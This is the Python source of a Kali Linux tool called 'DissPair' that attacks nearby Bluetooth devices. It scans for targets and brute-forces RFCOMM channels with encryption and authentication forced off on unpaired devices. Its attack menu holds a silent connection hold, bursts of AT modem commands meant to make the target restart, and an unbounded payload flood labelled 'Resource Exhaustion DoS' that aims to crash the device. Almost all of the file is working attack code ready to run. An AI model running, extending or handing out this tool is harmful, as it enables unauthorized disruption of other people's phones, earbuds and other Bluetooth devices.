#!/usr/bin/env python3

import os
import sys
import time
import threading
import subprocess
import socket
import struct
import re

# --- DEPENDENCY CHECK ---
try:
    import bluetooth
    PYBLUEZ_LOADED = True
except ImportError:
    PYBLUEZ_LOADED = False
    print("\n[\033[91m!\033[0m] \033[91mPyBluez is missing.\033[0m")
    print("    Run the following to install requirements on Kali:")
    print("    sudo apt update && sudo apt install -y bluetooth libbluetooth-dev")
    print("    pip install pybluez2 --break-system-packages\n")
    sys.exit(1)

try:
    import asyncio
    from bleak import BleakScanner
    BLE_SUPPORT = True
except ImportError:
    BLE_SUPPORT = False

# --- COLORS ---
C = "\033[96m"  # Cyan
R = "\033[91m"  # Red
G = "\033[92m"  # Green
Y = "\033[93m"  # Yellow
D = "\033[90m"  # Dark Gray
W = "\033[0m"   # White/Reset
M = "\033[95m"  # Magenta

# --- NATIVE LINUX BLUETOOTH CONSTANTS ---
# Using getattr fallback just in case the socket module is missing them
SOL_BLUETOOTH = getattr(socket, 'SOL_BLUETOOTH', 274)
BT_SECURITY = 4
BT_SECURITY_LOW = 1  # No encryption, No authentication

class DissPairCLI:
    def __init__(self):
        self.devices = []
        self.target_mac = None
        self.target_name = None
        self.open_channels = []
        self.payload_size = 2048

    def clear(self):
        os.system('clear')

    def banner(self):
        self.clear()
        print(f"{C}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{W}")
        print(f" {C}█▀▀▄ █ ▄▀▀ ▄▀▀   {R}█▀▀▄ ▄▀▄ █ █▀▀▄{W}")
        print(f" {C}█  █ █ ▀▀▄ ▀▀▄ {D}━━{R} █▄▄▀ █▀█ █ █▄▄▀{W}   {D}| KALI LINUX EDITION{W}")
        print(f" {C}▀▀▀  ▀ ▀▀  ▀▀    {R}█    ▀ ▀ ▀ ▀  ▀▄{W}  {D} | v1.82 (L2CAP Audio Bypass){W}")
        print(f"{C}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{W}\n")

    def input_prompt(self, text):
        return input(f"{C}Diss{R}Pair{W} > {text}")

    def get_rfcomm_socket(self):
        """Cross-platform NATIVE socket generation (Bypasses buggy PyBluez wrappers)"""
        try:
            # Python 3 Native Linux Bluetooth Socket (Direct Kernel Access)
            return socket.socket(socket.AF_BLUETOOTH, socket.SOCK_STREAM, socket.BTPROTO_RFCOMM)
        except AttributeError:
            # Absolute fallback if AF_BLUETOOTH is somehow missing from Python build
            return bluetooth.BluetoothSocket(bluetooth.RFCOMM)

    # ─── SCANNING ─────────────────────────────────────────────────────────────

    def scan_classic(self):
        if not hasattr(bluetooth, 'discover_devices'):
            print(f"[{R}!{W}] 'discover_devices' is missing from the bluetooth library.")
            time.sleep(3)
            return

        print(f"[{C}*{W}] Initializing Classic BR/EDR Discovery (10 seconds)...")
        try:
            nearby = bluetooth.discover_devices(duration=10, lookup_names=True, flush_cache=True)
            for addr, name in nearby:
                self._add_device(addr, name or "Unknown", "Classic")
            print(f"[{G}+{W}] Scan complete. Found {len(nearby)} classic devices.")
        except Exception as e:
            print(f"[{R}-{W}] Classic scan failed: {e}")
            print(f"    Check if Bluetooth is unblocked: 'sudo rfkill unblock bluetooth'")
        time.sleep(2)

    async def _scan_ble_async(self):
        print(f"[{C}*{W}] Initializing BLE Passive Radar (5 seconds)...")
        try:
            devices = await BleakScanner.discover(timeout=5.0)
            for d in devices:
                self._add_device(d.address, d.name or "Unknown", "BLE")
            print(f"[{G}+{W}] BLE radar complete.")
        except Exception as e:
            print(f"[{R}-{W}] BLE scan failed: {e}")

    def scan_ble(self):
        if not BLE_SUPPORT:
            print(f"[{R}!{W}] Bleak library missing. Cannot scan BLE.")
            print(f"    Run: pip install bleak")
            time.sleep(2)
            return
        asyncio.run(self._scan_ble_async())
        time.sleep(2)

    def list_paired(self):
        print(f"[{C}*{W}] Fetching local paired devices from BlueZ...")
        try:
            res = subprocess.run(['bluetoothctl', 'devices', 'Paired'], capture_output=True, text=True)
            lines = res.stdout.strip().split('\n')
            count = 0
            for line in lines:
                if 'Device' in line:
                    parts = line.split(' ', 2)
                    if len(parts) >= 3:
                        self._add_device(parts[1], parts[2], "PAIRED")
                        count += 1
            print(f"[{G}+{W}] Found {count} paired devices.")
        except Exception as e:
            print(f"[{R}-{W}] Failed to fetch paired devices: {e}")
        time.sleep(2)

    def manual_target_entry(self):
        self.banner()
        print(f"[{C}*{W}] Manual Target Entry")
        print(f"    Enter the MAC Address of your target (Format: XX:XX:XX:XX:XX:XX)\n")
        
        mac = self.input_prompt("MAC Address: ").strip().upper()
        if len(mac) == 17 and mac.count(':') == 5:
            name = self.input_prompt("Optional Target Name: ").strip() or "Manual Target"
            self._add_device(mac, name, "MANUAL")
            
            self.target_mac = mac
            self.target_name = name
            self.open_channels = []
            print(f"\n[{G}+{W}] Target locked: {self.target_name} ({self.target_mac})")
        else:
            print(f"\n[{R}!{W}] Invalid MAC format. Must be XX:XX:XX:XX:XX:XX")
        time.sleep(2)

    def _add_device(self, mac, name, dtype):
        for d in self.devices:
            if d['mac'] == mac:
                return
        self.devices.append({'mac': mac, 'name': name, 'type': dtype})

    def select_target(self):
        if not self.devices:
            print(f"[{Y}!{W}] No devices in memory. Please scan or enter manually.")
            time.sleep(2)
            return

        self.banner()
        print(f"{D}{'ID':<4} | {'MAC ADDRESS':<18} | {'TYPE':<10} | {'NAME'}{W}")
        print("-" * 60)
        for idx, dev in enumerate(self.devices):
            t_color = C if dev['type'] == 'Classic' else M if dev['type'] == 'MANUAL' else R if dev['type'] == 'PAIRED' else G
            print(f"{idx:<4} | {dev['mac']:<18} | {t_color}{dev['type']:<10}{W} | {dev['name']}")
        
        try:
            print("")
            sel_input = self.input_prompt("Enter Target ID (or press Enter to cancel): ")
            if not sel_input.strip():
                return
                
            sel = int(sel_input)
            self.target_mac = self.devices[sel]['mac']
            self.target_name = self.devices[sel]['name']
            self.open_channels = [] 
            print(f"[{G}+{W}] Target locked: {self.target_name} ({self.target_mac})")
            time.sleep(1)
        except (ValueError, IndexError):
            print(f"[{R}!{W}] Invalid selection.")
            time.sleep(1)

    # ─── ENUMERATION ──────────────────────────────────────────────────────────

    def enumerate_target(self):
        if not self.target_mac:
            print(f"[{Y}!{W}] Select a target first.")
            time.sleep(2)
            return

        self.banner()
        print(f"[{C}*{W}] Commencing RFCOMM Bruteforce on {self.target_mac}...")
        print(f"{D}    Bypassing SDP. Testing channels 1-30 sequentially.{W}\n")
        
        # --- NEW LOGIC: Check if Paired & Sever Audio Streams ---
        target_is_paired = False
        for d in self.devices:
            if d['mac'] == self.target_mac and d['type'] == 'PAIRED':
                target_is_paired = True
                break

        # Double check via bluetoothctl in case user entered MAC manually
        try:
            res = subprocess.run(['bluetoothctl', 'info', self.target_mac], capture_output=True, text=True)
            if "Paired: yes" in res.stdout:
                target_is_paired = True
        except: pass

        if target_is_paired:
            print(f"[{C}*{W}] Target is Paired. Releasing Kali's active audio sinks (A2DP/HFP)...")
            print(f"{D}    (If earbuds are connected to audio, they reject new RFCOMM channels){W}\n")
            subprocess.run(['bluetoothctl', 'disconnect', self.target_mac], capture_output=True)
            time.sleep(2.0) # Give baseband time to completely drop the ACL link

        self.open_channels = []
        last_os_error = None

        for ch in range(1, 31):
            sys.stdout.write(f"\r{D}    Probing Channel {ch}/30...{W}")
            sys.stdout.flush()
            
            is_open = False
            c_type = ""

            if target_is_paired:
                # EXACT MATCH TO ANDROID APK: Try Secure Only
                # Prevents "Baseband Poisoning" from rejected insecure probes
                sock_sec = self.get_rfcomm_socket()
                sock_sec.settimeout(6.0)
                try:
                    sock_sec.connect((self.target_mac, ch))
                    is_open = True
                    c_type = "Paired"
                except Exception as e:
                    if not last_os_error: last_os_error = str(e)
                finally:
                    try: sock_sec.close() 
                    except: pass
            else:
                # UNPAIRED: Try Insecure first
                sock_insec = self.get_rfcomm_socket()
                sock_insec.settimeout(6.0) 
                
                try:
                    opt = struct.pack("BB", BT_SECURITY_LOW, 0)
                    if hasattr(sock_insec, 'setsockopt'):
                        sock_insec.setsockopt(SOL_BLUETOOTH, BT_SECURITY, opt)
                    elif hasattr(sock_insec, '_sock') and hasattr(sock_insec._sock, 'setsockopt'):
                        sock_insec._sock.setsockopt(SOL_BLUETOOTH, BT_SECURITY, opt)
                except Exception:
                    pass

                try:
                    sock_insec.connect((self.target_mac, ch))
                    is_open = True
                    c_type = "Unpaired"
                except Exception as e:
                    if not last_os_error: last_os_error = str(e)
                finally:
                    try: sock_insec.close() 
                    except: pass

                if not is_open:
                    time.sleep(0.5) # Let baseband breathe after rejection

                    # Fallback to Secure
                    sock_sec = self.get_rfcomm_socket()
                    sock_sec.settimeout(6.0)
                    try:
                        sock_sec.connect((self.target_mac, ch))
                        is_open = True
                        c_type = "Paired"
                    except Exception as e:
                        pass
                    finally:
                        try: sock_sec.close() 
                        except: pass

            if is_open:
                self.open_channels.append({'ch': ch, 'type': c_type})
                sys.stdout.write(f"\r[{G}+{W}] Found open RFCOMM Channel: {ch} ({c_type})       \n")
                sys.stdout.flush()
            
            time.sleep(0.1)
                
        print(f"\n[{C}*{W}] Enumeration complete. Discovered {len(self.open_channels)} open channels.")
        
        # --- ERROR TRAP ---
        if len(self.open_channels) == 0 and last_os_error:
            print(f"[{Y}!{W}] Diagnostic Info -> Kali Kernel reported: {last_os_error}")
            print(f"      (If 'Host is down' -> Target is asleep or out of range)")
            print(f"      (If 'Connection refused' -> Target actively rejected you)")
            
        time.sleep(3)

    # ─── ATTACK VECTORS ───────────────────────────────────────────────────────

    def interact_channel(self):
        if not self.open_channels:
            print(f"[{Y}!{W}] No verified channels. Enumerate first.")
            time.sleep(2)
            return

        self.banner()
        print(f"[{C}*{W}] Verified Channels for {self.target_mac}:")
        for idx, item in enumerate(self.open_channels):
            print(f"    [{idx}] Channel {item['ch']}  ({item['type']})")
            
        try:
            print("")
            sel = int(self.input_prompt("Select Channel ID to interface: "))
            selected_item = self.open_channels[sel]
            ch = selected_item['ch']
            c_type = selected_item['type']
        except (ValueError, IndexError):
            print(f"[{R}!{W}] Invalid selection.")
            time.sleep(1)
            return

        while True:
            self.banner()
            print(f"    {C}TARGET:{W}  {self.target_name} ({self.target_mac})")
            print(f"    {C}CHANNEL:{W} {ch} [{c_type}]")
            print(f"    {C}PAYLOAD:{W} {self.payload_size} Bytes\n")
            
            print(f"    {D}[1]{W} {C}CONNECT{W}   (Silent verification)")
            print(f"    {D}[2]{W} {M}Linux TTY{W} (Simulate ModemManager AT Probes)")
            print(f"    {D}[3]{W} {R}FLOOD{W}     (Resource Exhaustion DoS)")
            print(f"    {D}[4]{W} Set Payload Size")
            print(f"    {D}[0]{W} Back to Main Menu\n")
            
            cmd = self.input_prompt("Action: ")

            if cmd == '1':
                self._action_connect(ch, c_type)
            elif cmd == '2':
                self._action_kali_sim(ch, c_type)
            elif cmd == '3':
                self._action_flood(ch, c_type)
            elif cmd == '4':
                try:
                    self.payload_size = int(self.input_prompt("Enter size in bytes (e.g. 2048): "))
                except ValueError:
                    pass
            elif cmd == '0':
                break

    def _create_attack_socket(self, c_type):
        """Creates the socket with the correct security level based on enumeration phase"""
        sock = self.get_rfcomm_socket()
        sock.settimeout(6.0)
        if c_type == "Unpaired":
            try:
                opt = struct.pack("BB", BT_SECURITY_LOW, 0)
                if hasattr(sock, 'setsockopt'):
                    sock.setsockopt(SOL_BLUETOOTH, BT_SECURITY, opt)
                elif hasattr(sock, '_sock') and hasattr(sock._sock, 'setsockopt'):
                    sock._sock.setsockopt(SOL_BLUETOOTH, BT_SECURITY, opt)
            except Exception:
                pass
        return sock

    def _action_connect(self, ch, c_type):
        print(f"\n[{C}*{W}] Establishing silent L2CAP/RFCOMM link to Ch {ch}...")
        sock = self._create_attack_socket(c_type)
        try:
            sock.connect((self.target_mac, ch))
            print(f"[{G}+{W}] Connection Verified. Socket is held open silently.")
            self.input_prompt("Press ENTER to drop the socket and return...")
        except Exception as e:
            print(f"[{R}-{W}] Connection refused or target offline: {e}")
            time.sleep(2)
        finally:
            try: sock.close()
            except: pass

    def _action_kali_sim(self, ch, c_type):
        print(f"\n[{M}*{W}] Simulating Linux TTY Modem noise on Ch {ch}...")
        sock = self._create_attack_socket(c_type)
        try:
            sock.connect((self.target_mac, ch))
            print(f"[{G}+{W}] Connected! Blasting Linux AT Modem probes...")
            
            kali_noise = [
                b"AT\r\n", b"ATZ\r\n", b"AT+CGMI\r\n", 
                b"AT+CMEE=1\r\n", b"AT+GMM\r\n", b"AT+GMR\r\n"
            ] * 10
            
            for probe in kali_noise:
                sock.send(probe)
                time.sleep(0.01)
                
            print(f"[{C}*{W}] Burst complete. Check if target restarted.")
            time.sleep(2)
        except Exception as e:
            print(f"[{R}-{W}] Target rejected connection or crashed: {e}")
            time.sleep(2)
        finally:
            try: sock.close()
            except: pass

    def _action_flood(self, ch, c_type):
        print(f"\n[{R}!!{W}] INITIATING RESOURCE EXHAUSTION FLOOD ON CH {ch}...")
        sock = self._create_attack_socket(c_type)
        try:
            sock.connect((self.target_mac, ch))
            print(f"[{G}+{W}] Socket locked. Pumping {self.payload_size}B chunks...")
            
            payload = b"X" * self.payload_size
            blocks_sent = 0
            
            try:
                while True:
                    sock.send(payload)
                    blocks_sent += 1
                    
                    if blocks_sent % 10 == 0:
                        sys.stdout.write(f"\r{D}    [>] Sent {blocks_sent} blocks...{W}")
                        sys.stdout.flush()
                    
                    time.sleep(0.01)
                    
            except KeyboardInterrupt:
                print(f"\n[{Y}*{W}] Flood stopped by user. {blocks_sent} blocks sent.")
            except Exception:
                print(f"\n[{G}+{W}] Fuzzing Completed: The device seems to be crashed or is rejecting packets, kindly verify manually.")
                
        except Exception as e:
            print(f"[{R}-{W}] Connection failed before flood: {e}")
        finally:
            try: sock.close()
            except: pass
            self.input_prompt("Press ENTER to return...")

    # ─── MAIN LOOP ────────────────────────────────────────────────────────────

    def run(self):
        while True:
            self.banner()
            
            t_str = f"{G}{self.target_name} ({self.target_mac}){W}" if self.target_mac else f"{D}None{W}"
            
            print(f"    {C}1.{W} Scan Classic BR/EDR")
            print(f"    {C}2.{W} Scan BLE (Radar Only)")
            print(f"    {C}3.{W} Load Local Paired Devices")
            print(f"    {C}4.{W} Enter Target MAC Manually\n")
            
            print(f"    {C}5.{W} Select Target       [ Current: {t_str} ]")
            print(f"    {C}6.{W} Enumerate Target    [ Ports Open: {len(self.open_channels)} ]")
            print(f"    {C}7.{W} Open Attack Menu    (Connect / TTY / Flood)\n")
            
            print(f"    {D}0.{W} Exit")
            
            cmd = self.input_prompt("Select Option: ")

            if cmd == '1':
                self.scan_classic()
                if self.devices: self.select_target()
            elif cmd == '2':
                self.scan_ble()
                if self.devices: self.select_target()
            elif cmd == '3':
                self.list_paired()
                if self.devices: self.select_target()
            elif cmd == '4':
                self.manual_target_entry()
            elif cmd == '5':
                self.select_target()
            elif cmd == '6':
                self.enumerate_target()
            elif cmd == '7':
                self.interact_channel()
            elif cmd == '0':
                self.clear()
                sys.exit(0)

if __name__ == "__main__":
    try:
        cli = DissPairCLI()
        cli.run()
    except KeyboardInterrupt:
        print("\nExiting...")
        sys.exit(0)
